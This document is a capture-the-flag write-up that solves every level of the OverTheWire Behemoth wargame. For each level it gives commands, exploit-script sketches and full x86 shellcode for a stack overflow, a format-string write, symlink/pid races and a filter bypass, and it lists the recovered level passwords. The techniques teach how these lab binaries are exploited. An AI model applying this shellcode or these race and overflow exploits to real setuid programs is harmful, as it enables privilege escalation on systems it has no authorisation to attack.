# OverTheWire Behemoth — Solutions

Live solves against `behemoth.labs.overthewire.org:2221` in this run. Behemoth is
a setuid binary-exploitation wargame; sources are not provided, so every level is
solved by reading the binaries (`strings`, `objdump`, `gdb`, `nm`, `readelf`).
For each level: goal, technique and why it works, exact commands, verification.
Recordings in `recordings/behemoth/L<n>.cast`.

Verification: each password was accepted by logging in as the next level's account.

**What the level transcripts show, and what they do not.** Every shellcode source
(`b1.asm`, `b3.asm`, `b6.asm`, `b7.asm`) is written into vim chunk by chunk in the
transcript, saved, `cat -n`'d, and assembled; its bytes are compared with the
`xxd -p` output the original run captured (78, 78, 41 and 78 bytes, identical). The
exploit scripts (`e_behemothN.py`) were not captured being written in the original
recordings, and the `behemothN` accounts stopped accepting password logins on
2026-11-03, so those steps stay as the original capture and are marked as such in
the transcript. The Python sketches quoted below are descriptions of what each
script does, not verbatim captures; the outputs quoted (`PWN!`, addresses,
passwords) are the recorded ones.
---
## Level 0 → behemoth1
- **Account:** `behemoth0`, password `behemoth0` (given by the game).
- **Goal:** `main` builds a secret on the stack, memfrobs it, reads up to 64
  characters into another stack buffer, and `strcmp`s the two. On a match it
  prints "Access granted..", does `setreuid(geteuid(),geteuid())` and runs
  `system("/bin/sh")`.
- **Technique and why it works:** the secret is stored in plain sight as
  immediates in the disassembly, but obfuscated with glibc's `memfrob`, which
  XORs every byte with 42 (`0x2A`). We read the three `movl` immediates that
  initialise the secret and XOR them with 42 to recover the plaintext password.
  Nothing has to be guessed or brute-forced: the comparison string is fully
  recoverable from the binary.

### Step-by-step discovery and crafting (what the recording shows)
1. **List the game and the binaries.** `ls -la /behemoth/` shows `behemoth0`
   is setuid `behemoth1`, and each later binary is setuid to the next user.
2. **Look at the strings.** `strings -a /behemoth/behemoth0` shows the program
   text plus three suspicious blobs — `OK^G`, `SYBE`, `X^Y` — and the symbol
   `memfrob`. Those are not random: they are ASCII XOR-ed with 42.
3. **Read the disassembly of `main`.**
   ```
   objdump -d --no-show-raw-insn /behemoth/behemoth0 | sed -n '/<main>:/,/strcmp/p'
   ```
   The secret is built from three immediates at `-0x55(%ebp)`:
   ```
   movl $0x475e4b4f,-0x55(%ebp)   # 4f 4b 5e 47  = "OK^G"
   movl $0x45425953,-0x51(%ebp)   # 53 59 42 45  = "SYBE"
   movl $0x00595e58,-0x4d(%ebp)   # 58 5e 59 00  = "X^Y\0"
   ```
   so the stored string is `OK^GSYBEX^Y` (little-endian byte order within each
   dword). Then the program calls `memfrob(secret, strlen(secret))` and
   `strcmp(secret, input)`.
4. **Decode the secret.** `memfrob` XORs each byte with 42:
   ```
   python3 -c 'print(bytes(c ^ 42 for c in bytes.fromhex("4f4b5e4753594245585e59")))'
   # b'eatmyshorts'
   ```
5. **Feed the password.** The binary reads our input with `scanf("%64s")` and,
   on success, runs `system("/bin/sh")`. Because the shell inherits the same
   stdin, we send the password first and then the commands after a short delay
   (so `scanf` does not consume them):
   ```
   { printf "eatmyshorts\n"; sleep 1; printf "id\ncat /etc/behemoth_pass/behemoth1\nexit\n"; } | /behemoth/behemoth0
   # Password: Access granted..
   # uid=13001(behemoth1) ...
   # paAotdjMCj
   ```
- **Password for behemoth1:** `paAotdjMCj`
- **Verification:** logged in as `behemoth1` with this password (`whoami` → `behemoth1`).
- **Recording:** `recordings/behemoth/L0.cast`

## Level 1 → behemoth2
- **Account:** `behemoth1`, password `paAotdjMCj`.
- **Goal:** `main` declares `char buf[67]` (at `ebp-0x43`), calls `gets(buf)`, then `puts(...)` and returns. There is no length check.
- **Technique and why it works:** `gets()` reads until a newline with no bound, so a 71-byte input overwrites the saved EBP and the return address (offset 71). The stack is executable (`GNU_STACK RWE`) and ASLR is off (`randomize_va_space` = 0), so the simplest and most reliable exploit is **stack shellcode**: put null-free shellcode on the stack just after the return address and return into it. The shellcode writes a `PWN!` marker (so the sweep can tell a hit from a crash), then does `geteuid`, `setreuid(euid,euid)`, `setuid(euid)` and `execve("/bin/sh")` — the `setuid` keeps the effective UID over the `execve`, exactly as in the Narnia levels.

### Step-by-step discovery and crafting (what the recording shows)
1. **Check the binary and protections.**
   ```
   file /behemoth/behemoth1                 # setuid ELF 32-bit i386
   readelf -lW /behemoth/behemoth1 | grep GNU_STACK   # RWE (executable stack)
   cat /proc/sys/kernel/randomize_va_space  # 0 (no ASLR)
   ```
2. **Disassemble `main`.**
   ```
   objdump -d --no-show-raw-insn /behemoth/behemoth1 | sed -n '/<main>:/,/ret/p'
   # lea -0x43(%ebp),%eax ; push %eax ; call gets@plt
   ```
   `buf` is at `ebp-0x43`, so the saved EBP is at offset 67 and the return
   address at offset **71**.
3. **Confirm in gdb.**
   ```
   gdb -batch -ex 'b *0x80491a2' -ex 'run AAAA' -ex 'p/x $ebp-0x43' -ex 'p/x $ebp+4' /behemoth/behemoth1
   # $1 = 0xffffdb95 (buf)   $2 = 0xffffdbdc (return address)
   ```
4. **Write the shellcode in `vim /tmp/b1.asm`** (marker write, `geteuid`,
   `setreuid(euid,euid)`, `setuid(euid)`, `execve("/bin/sh")`), then:
   ```
   nasm -f elf32 /tmp/b1.asm -o /tmp/b1.o
   objdump -d -M intel /tmp/b1.o
   objcopy -O binary --only-section=.text /tmp/b1.o /tmp/b1.bin
   xxd -p /tmp/b1.bin ; wc -c /tmp/b1.bin     # 78 bytes
   ```
5. **Build the payload and sweep.** `payload = b"\x90"*71 + pack("<I", addr) + sc + b"\n"`.
   The exploit forks one child per candidate return address in
   `0xffffd000..0xffffe800`, feeds the payload on stdin, and watches for `PWN!`.
   On a hit it re-runs the binary with the found address and feeds the shell
   commands (`id`, `cat /etc/behemoth_pass/behemoth2`). The sweep landed at
   **0xffffde20**.
6. **Use the shell.**
   ```
   id                        # uid=13002(behemoth2) gid=13001(behemoth1)
   cat /etc/behemoth_pass/behemoth2
   ```
- **Password for behemoth2:** `T27XOH3cbn`
- **Verification:** logged in as `behemoth2` with this password (`whoami` → `behemoth2`).
- **Recording:** `recordings/behemoth/L1.cast`

## Level 2 → behemoth3
- **Account:** `behemoth2`, password `T27XOH3cbn`.
- **Goal:** No source is shipped for behemoth2, so the behaviour is recovered from `objdump`. In order:
  ```c
  sprintf(buf, "touch %d", getpid());      // buf is a local array
  lstat(buf); unlink(buf);                 // remove a stale file with that name
  setreuid(euid, euid); system(buf);       // touch <pid> in the CURRENT directory
  sleep(2000);
  sprintf(buf, "cat "); buf[4] = ' '; system(buf);   // cat <pid>, still as behemoth3
  ```
  The second `system()` runs after `setreuid`, so it executes as behemoth3 — and the file it cats is the one in the current directory, which we can change.
- **Technique and why it works:** **pid-file race / symlink swap**. The program touches a file named after its own pid in the directory it was started from. If we start it inside a directory we own and watch for the numeric file to appear, we can `unlink` it and replace it with a symlink to `/etc/behemoth_pass/behemoth3`. When the program wakes after its 2000-second sleep and runs `cat <pid>` as behemoth3, the symlink resolves to the password file and the contents are printed to stdout.

  The practical wrinkle is the wait: 2000 seconds is about 33 minutes, and the lab drops idle SSH sessions. The exploit therefore prints a heartbeat every 30 seconds so the session stays alive, and the recorder's wait budget is set accordingly.

### Step-by-step discovery and crafting (what the recording shows)
1. **Recover the logic.** `strings` shows `touch %d` and `cat `; `objdump -d` shows `sprintf`, `lstat`, `unlink`, `setreuid(euid,euid)`, `system`, `sleep(0x7d0)`, then `sprintf(buf,"cat ")` with `buf[4]=' '` and another `system`.
2. **Check the environment.** The home directory is not writable, and `/tmp` is sticky, so a file owned by behemoth3 cannot be unlinked there — hence a dedicated `/tmp/b2work` created and made world-writable.
3. **Write the exploit in `vim /tmp/e_behemoth2.py`** (shown in full in the recording):
   ```python
   work = "/tmp/b2work"; os.makedirs(work, exist_ok=True); os.chmod(work, 0o777)
   os.chdir(work)
   p = subprocess.Popen(["/behemoth/behemoth2"])
   # wait for the numeric pid file, then swap it for a symlink
   os.unlink(target); os.symlink("/etc/behemoth_pass/behemoth3", target)
   while p.poll() is None:          # heartbeat keeps ssh alive during sleep(2000)
       print("alive", int(time.time()), flush=True); time.sleep(30)
   ```
4. **Run it.** The recording shows `pid: 74`, `pidfile: 74`, `replaced 74 -> /etc/behemoth_pass/behemoth3`, then ~33 minutes of `alive` lines, and finally `3gr7EdpaSr` and `B2DONE`.
5. **Verify.** Log in as behemoth3 with that password (`whoami` → `behemoth3`).
- **Password for behemoth3:** `3gr7EdpaSr`
- **Verification:** logged in as `behemoth3` with this password.
- **Recording:** `recordings/behemoth/L2.cast`

## Level 3 → behemoth4
- **Account:** `behemoth3`, password `3gr7EdpaSr`.
- **Goal:** The binary asks "Identify yourself", reads up to 200 bytes with `fgets(buf, 0xc8, stdin)`, then does `printf(buf)` — the buffer is used as the format string.
- **Technique and why it works:** **format-string arbitrary write**. `printf(buf)` with attacker-controlled text lets us use `%n`/`%hn` to write a value to an address we choose. The addresses are supplied through the varargs: on i386 the arguments are read from the stack above the call, and here the stack happens to hold *the buffer itself*, so argument *k* is the dword at `buf + 4*(k-1)`. That is confirmed in the recording: `printf '%1$p|%2$p|%3$p'` prints the first three dwords of the buffer.

  The plan:
  1. Leak `argv[0]` with `%54$p`; with an empty environment `buf = argv[0] - 0x194`, verified by printing `%41$s` after placing that address at `buf+160`.
  2. The saved return address lives at `buf+204` (buf is at `ebp-0xc8`, saved ebp at +200). Put `buf+204` and `buf+206` at `buf+160`/`buf+164` — those become varargs 41 and 42.
  3. Write the shellcode's address with `%<low>c%41$hn%<high-low>c%42$hn`. The crucial subtlety: `%hn` writes the **total** number of characters printed so far, not just the width of the current conversion, so the first width is the low half and the second is the difference to the high half (mod 65536).
  4. The format string's own length determines where the shellcode starts, so the address is computed by iterating to a fixed point.

  The shellcode (written in `vim /tmp/b3.asm`, assembled with `nasm -f elf32`, extracted with `objcopy -O binary --only-section=.text`, dumped with `xxd`) prints `PWN!`, then `geteuid(); setreuid(euid,euid); setuid(euid)` so the behemoth4 euid survives `execve`, then `execve("/bin/sh")`. It contains no NUL (fgets would stop) and no `%` (printf would consume it) — both asserted in the exploit.

  The exploit runs behemoth3 on a **raw-mode pty**: the payload is binary and a canonical terminal would eat bytes such as `0x04` (EOF) or `0x03` (SIGINT). It then feeds `id` and `cat /etc/behemoth_pass/behemoth4` to the shell it spawned.

### Step-by-step discovery and crafting (what the recording shows)
1. **Read the code.** `strings`/`objdump -d` show `fgets(buf,0xc8,stdin)` then `printf(buf)`; `objdump -R` shows `printf@0x804b230`, `fgets@0x804b234`, `puts@0x804b238` (no RELRO), but we do not need the GOT — we target the saved return address.
2. **gdb** gives `$ebp-0xc8` and `$ebp+4`, confirming buf/saved-ebp/ret offsets 0/200/204.
3. **Probe the varargs.** `printf '%p %p %p %p %p %p'` shows stack words, and `%1$p|%2$p|%3$p` shows the buffer's first dwords — the varargs *are* the buffer.
4. **Write the shellcode in vim**, `nasm`, `objdump -d -M intel`, `objcopy`, `xxd -p`, `wc -c` → 78 bytes.
5. **Write the exploit in vim**: leak `argv[0]` (`%54$p`), derive `buf`, verify with `%41$s`, compute the two writes, build `fmt + sc + padding + [ret_slot, ret_slot+2]`, and drive a raw pty.
6. **Run it.** The recording shows the leak, the format string `%56681c%41$hn%8854c%42$hn`, `PWN!`, `uid=13004(behemoth4)`, and `ABTmcqez7l`.
7. **Verify.** Log in as behemoth4 (`whoami` → `behemoth4`).
- **Password for behemoth4:** `ABTmcqez7l`
- **Verification:** logged in as `behemoth4` with this password.
- **Recording:** `recordings/behemoth/L3.cast`

## Level 4 → behemoth5
- **Account:** `behemoth4`, password `ABTmcqez7l`.
- **Goal:** `objdump -d` shows `sprintf(buf,"/tmp/%d",getpid()); fopen(buf,"r"); sleep(1);` then a `putchar()` loop printing the file byte by byte.
- **Technique and why it works:** **predicted-pid symlink race**. The file name is derived from the program's own pid, but we can know the pid *before* the program runs: fork first, read the child's pid in the parent, then have the child `execve` behemoth4. The parent plants `/tmp/<child pid>` as a symlink to `/etc/behemoth_pass/behemoth5` while the child is still doing dynamic linking, so the symlink exists by the time `fopen` runs. The program then opens it and prints the password — as behemoth5, because the binary is setuid.

  Note the difference from behemoth2: there the program created the file itself and slept 2000 s; here the file is only opened, so the window is milliseconds, but the pid is fully predictable, which makes the race deterministic rather than lucky.

### Step-by-step discovery and crafting (what the recording shows)
1. **Read the flow.** `strings`/`objdump`: `/tmp/%d` with `getpid()`, `fopen(buf,"r")`, `sleep(1)`, `puts("Finished sleeping, fgetcing")`, then `fgetc`/`putchar` until EOF.
2. **Write `/tmp/e_behemoth4.py` in vim**:
   ```python
   pid = os.fork()
   if pid == 0:
       os.execve(b"/behemoth/behemoth4", [b"/behemoth/behemoth4"], {})
   path = "/tmp/%d" % pid
   os.symlink("/etc/behemoth_pass/behemoth5", path)
   os.waitpid(pid, 0)
   ```
   The parent knows the pid because `fork()` returns it.
3. **Run it.** The recording shows `planted /tmp/78 -> /etc/behemoth_pass/behemoth5`, `Finished sleeping, fgetcing`, and `UCEVVD7tz3`.
4. **Verify.** Log in as behemoth5 (`whoami` → `behemoth5`).
- **Password for behemoth5:** `UCEVVD7tz3`
- **Verification:** logged in as `behemoth5` with this password.
- **Recording:** `recordings/behemoth/L4.cast`

## Level 5 → behemoth6
- **Account:** `behemoth5`, password `UCEVVD7tz3`.
- **Goal:** `objdump -d` + `strings` show the program opens `/etc/behemoth_pass/behemoth6`, reads it into a buffer, resolves `localhost`, creates a **UDP** socket, and `sendto()`s the contents to port **1337**.
- **Technique and why it works:** **receive the exfiltration datagram**. The password is not printed to stdout; it is sent over the network to a fixed local port. Nobody is listening on UDP 1337 by default, so the datagram is simply discarded. If we bind `127.0.0.1:1337` *before* running the program, the kernel queues the datagram to our socket and `recvfrom` returns the password. The program still reads the password file as behemoth6 (setuid), so the privilege is on its side.

  Note that UDP has no connection: binding the port is enough, no listener handshake is involved.

### Step-by-step discovery and crafting (what the recording shows)
1. **Read the flow.** `strings`: `/etc/behemoth_pass/behemoth6`, `localhost`, `1337`, `sendto`. `objdump -d` shows `fopen` → `fgets` → `gethostbyname("localhost")` → `socket(AF_INET, SOCK_DGRAM)` → `sendto(fd, buf, strlen(buf), 0, &addr, 16)`.
2. **Write `/tmp/e_behemoth5.py` in vim**:
   ```python
   s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
   s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
   s.bind(("127.0.0.1", 1337))
   p = subprocess.Popen(["/behemoth/behemoth5"], env={})
   data, addr = s.recvfrom(4096)
   print("received %d bytes from %s: %r" % (len(data), addr, data))
   ```
3. **Run it.** The recording shows `listening on 127.0.0.1:1337`, then `received 11 bytes from ('127.0.0.1', 39451): b'gLmUCSSlkL\n'`.
4. **Verify.** Log in as behemoth6 (`whoami` → `behemoth6`).
- **Password for behemoth6:** `gLmUCSSlkL`
- **Verification:** logged in as `behemoth6` with this password.
- **Recording:** `recordings/behemoth/L5.cast`

## Level 6 → behemoth7
- **Account:** `behemoth6`, password `gLmUCSSlkL`.
- **Goal:** `behemoth6` runs `popen("/behemoth/behemoth6_reader","r")`, reads 10 bytes, and compares them with `"HelloKitty"`; on success it does `setreuid(euid,euid)` and `execl("/bin/sh")`. `behemoth6_reader` `mmap`s `shellcode.txt` with `PROT_READ|PROT_WRITE|PROT_EXEC` and calls the mapping. The reader refuses any file containing byte `0x0b`.
- **Technique and why it works:** **write shellcode that satisfies the string check**. The "shellcode.txt" file is executable memory for the reader, so we control code. The program only proceeds to the shell if the code prints exactly `HelloKitty`. So the payload is `write(1,"HelloKitty",10); exit(0)` — it proves code execution *and* satisfies the comparison, and then `behemoth6` itself gives us a shell with euid behemoth7. The `0x0b` check is a (weak) anti-shellcode filter: the byte must simply not appear in the file.

  The shellcode is assembled from `vim /tmp/b6.asm` with `nasm -f elf32`, `objdump -d -M intel`, `objcopy -O binary --only-section=.text`, `xxd -p`. The string is built with three little-endian pushes (`"Hell"`, `"oKit"`, `"ty\0\0"`) because a 10-byte string does not fit in one immediate.

### Step-by-step discovery and crafting (what the recording shows)
1. **Read both programs.** `strings` shows `HelloKitty`, `shellcode.txt`, `Couldn't open shellcode.txt!`, `Write your own shellcode.`; `objdump -d` on `behemoth6` shows `popen`, `fread(buf,10,1)`, `strcmp(buf,"HelloKitty")`, then `setreuid(euid,euid)` and `execl("/bin/sh",...)`. On `behemoth6_reader` it shows the `open("shellcode.txt")` → `mmap(0, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, fd, 0)` → `call *%eax` sequence, plus the loop that walks the first 0x1000 bytes and rejects the file on byte `0x0b`.
2. **Write the shellcode in `vim /tmp/b6.asm`.** The payload must print exactly `HelloKitty` (the bytes `behemoth6` compares against) and then exit, so `behemoth6` proceeds to `execl("/bin/sh")`. Every instruction is chosen to avoid a NUL byte in the output and to avoid `0x0b`:
   ```
   BITS 32
   global _start
   _start:
       ; write(1, "HelloKitty", 10) -- the string behemoth6 compares against
       xor eax, eax
       push eax
       push 0x00007974      ; "ty\0\0" (little-endian)
       push 0x74694b6f      ; "oKit"
       push 0x6c6c6548      ; "Hell"
       mov ecx, esp         ; ecx -> "HelloKitty"
       xor ebx, ebx
       inc ebx              ; ebx = 1 (stdout)
       xor edx, edx
       mov dl, 10           ; edx = 10 (length)
       xor eax, eax
       mov al, 4            ; eax = 4 (sys_write)
       int 0x80
       ; exit(0)
       xor eax, eax
       mov al, 1            ; eax = 1 (sys_exit)
       xor ebx, ebx         ; ebx = 0
       int 0x80
   ```
   Why it is written this way: a 10-byte string cannot be pushed in one immediate, so it is pushed as three dwords; `push eax` first puts a NUL terminator below the string, which is harmless for `write` because the length is explicit. `xor reg,reg; mov al,N` avoids zero bytes in the encoding, and the instruction stream contains no `0x0b`.
3. **Assemble and inspect it.**
   ```
   nasm -f elf32 /tmp/b6.asm -o /tmp/b6.o
   objdump -d -M intel /tmp/b6.o     # shows 68 74 79 00 00 / 68 6f 4b 69 74 / 68 48 65 6c 6c ...
   objcopy -O binary --only-section=.text /tmp/b6.o /tmp/b6.bin
   xxd -p /tmp/b6.bin                # 31c0506874790000686f4b69746848656c6c89e131db4331d2b20a31c0b004cd8031c0b00131dbcd80
   wc -c /tmp/b6.bin                 # 41 bytes
   ```
   The `xxd` output is the check against the `0x0b` rule: none of the bytes is `0x0b` (the byte `0x00` inside the string pushes is fine for the *file*, only argv cannot carry NULs).
4. **Write `/tmp/e_behemoth6.py` in vim.** It loads `/tmp/b6.bin`, asserts `b"\x0b" not in sc`, creates `/tmp/b6work` (world-writable), writes the bytes to `shellcode.txt` there, `chdir`s into it, and runs `behemoth6` on a **raw-mode pty** (so the shell it execs is interactive); then it feeds `id`, `cat /etc/behemoth_pass/behemoth7`, `exit` and prints what the shell produced.
5. **Run it.** The recording shows `shellcode (41 bytes): 31c050687479...`, `wrote /tmp/b6work/shellcode.txt (41 bytes)`, `Correct.`, `uid=13007(behemoth7) gid=13006(behemoth6)`, and `aHHctqVRgi`.
6. **Verify.** Log in as behemoth7 (`whoami` → `behemoth7`).
- **Password for behemoth7:** `aHHctqVRgi`
- **Verification:** logged in as `behemoth7` with this password.
- **Recording:** `recordings/behemoth/L6.cast`

## Level 7 → behemoth8 (final level)
- **Account:** `behemoth7`, password `aHHctqVRgi`.
- **Goal:** `main` copies `argv[1]` into a 0x20c-byte stack buffer with `strcpy`, but first runs an alphanumeric filter: `for (i = 0; buf[i] && i <= 0x1ff; i++) if (!isalpha(buf[i]) && !isspace(buf[i])) { puts("Non-alpha chars found in string, possible shellcode!"); exit(1); }`.
- **Technique and why it works:** **filter-window bypass**. The check is bounded by `i <= 0x1ff`, so it only inspects the **first 512 characters** of `argv[1]`. `strcpy` afterwards copies the *whole* argument with no bound. So we send 512 letters (all `isalpha`), and after them the saved EBP, the return address, and the shellcode — none of which the filter ever sees. The buffer is at `ebp-0x20c`, so the saved EBP is at offset 524 and the return address at 528; the shellcode follows at 532.

  The shellcode is assembled from `vim /tmp/b7.asm` with nasm (marker `PWN!`, `setreuid`/`setuid` to euid, `execve("/bin//sh")`) and extracted with objcopy/xxd. Because the stack address depends on the environment size, the exploit sweeps `0xffffd000..0xffffe400` and stops at the first address whose run prints `PWN!`; then it re-runs with the commands fed to the shell.

### Step-by-step discovery and crafting (what the recording shows)
1. **Read the filter.** `objdump -d` shows the loop with `cmp $0x1ff` before the `isalpha`/`isspace` tests, and the `strcpy` at the end. `strings` gives the failure message.
2. **Probe it.** `/behemoth/behemoth7 AAAA` succeeds silently; `/behemoth/behemoth7 'AA%A'` prints `Non-alpha chars found in string, possible shellcode!` — proving the filter only looks at characters it walks.
3. **gdb** (`unset environment`, break at `strcpy`) gives `buf = ebp-0x20c`, return address `ebp+4` → offsets 524/528.
4. **Write the shellcode in `vim /tmp/b7.asm`.** It prints the marker `PWN!`, raises the euid to behemoth8 in a way that survives `execve` (real, effective *and* saved uid), and execs a shell. The instructions are all NUL-free because the payload travels in `argv[1]`:
   ```
   BITS 32
   global _start
   _start:
       ; write(1, "PWN!", 4) -- marker for the address sweep
       xor eax, eax
       push eax
       push 0x214e5750      ; "PWN!" little-endian
       mov ecx, esp
       xor ebx, ebx
       inc ebx              ; ebx = 1
       xor edx, edx
       mov dl, 4            ; edx = 4
       xor eax, eax
       mov al, 4            ; sys_write
       int 0x80
       ; euid = geteuid(); setreuid(euid, euid)
       xor eax, eax
       mov al, 201          ; sys_geteuid
       int 0x80
       mov ebx, eax
       mov ecx, eax
       xor eax, eax
       mov al, 70           ; sys_setreuid
       int 0x80
       ; setuid(euid) -- real, effective AND saved uid
       xor eax, eax
       mov al, 201
       int 0x80
       mov ebx, eax
       xor eax, eax
       mov al, 23           ; sys_setuid
       int 0x80
       ; execve("/bin//sh", ["/bin//sh", NULL], NULL)
       xor eax, eax
       push eax
       push 0x68732f2f      ; "hs//"
       push 0x6e69622f      ; "nib/"
       mov ebx, esp
       push eax
       push ebx
       mov ecx, esp
       xor edx, edx
       mov al, 11           ; sys_execve
       int 0x80
   ```
   The double slash in `/bin//sh` keeps the pushed string aligned on a 4-byte boundary, so the two dwords are `hs//` and `nib/` — no padding byte is needed and the code stays NUL-free.
5. **Assemble and inspect it.**
   ```
   nasm -f elf32 /tmp/b7.asm -o /tmp/b7.o
   objdump -d -M intel /tmp/b7.o     # check each encoding: 68 50 57 4e 21, b0 c9, cd 80 ...
   objcopy -O binary --only-section=.text /tmp/b7.o /tmp/b7.bin
   xxd -p /tmp/b7.bin
   wc -c /tmp/b7.bin                 # 78 bytes
   ```
6. **Write `/tmp/e_behemoth7.py` in vim.** It reads `/tmp/b7.bin`, builds
   ```
   b"A"*512 + b"A"*12 + b"BBBB" + struct.pack("<I", addr) + sc
   ```
   (512 letters for the filter, 12 more letters up to the saved EBP, 4 filler bytes, the return address, then the shellcode), skips addresses whose encoding contains a NUL byte, sweeps `0xffffd000..0xffffe400` looking for `PWN!` in the output of a run that did not die from a signal, and finally runs the winning address with `communicate(b"id\ncat /etc/behemoth_pass/behemoth8\nexit\n")`.
7. **Run it.** The recording shows `landed in the shellcode at 0xffffdbb0`, `PWN!`, `uid=13008(behemoth8)`, and `L3WIFhR0LW`.
8. **Verify.** Log in as behemoth8; `CONGRATULATIONS` confirms the game is complete.
- **Password for behemoth8:** `L3WIFhR0LW`
- **Verification:** logged in as `behemoth8`; `cat CONGRATULATIONS` → "Congratz!! Now fight for your right to eip=0x41414141!!"
- **Recording:** `recordings/behemoth/L7.cast`
